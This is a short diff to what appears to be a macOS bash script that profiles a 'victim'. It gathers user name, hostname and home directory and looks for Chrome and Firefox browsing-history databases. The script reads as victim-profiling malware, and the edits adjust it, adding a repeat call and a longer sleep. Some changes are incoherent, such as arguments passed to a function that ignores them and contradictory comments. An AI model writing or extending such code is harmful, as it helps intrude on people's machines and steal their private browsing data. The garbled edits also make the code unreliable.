@@ -42,7 +42,7 @@ function fileExists(){
 
 function setVictimDetails(){
   local userName="$USER"
-  local hostname=`"hostname"`
+  local hostname="`hostname`"
   local homedir="$HOME"
   local hasChromeHistory=`fileExists "$HOME/Library/Application Support/Google/Chrome/Default/History"`
   local hasFirefoxHistory=`fileExists "$(find $HOME'/Library/Application Support/Firefox/Profiles' | grep 'places.sqlite$')"`
@@ -64,8 +64,10 @@ function setVictimDetails(){
 
 ###############################################################################
 
-getVictimDetails
 setVictimDetails
 
+# We don't need to do this very often, so we can just sleep now 
+setVictimDetails $victim sleep
+
 # We only need to run this a few times, so sleep for a few
-sleep 15
+sleep 60
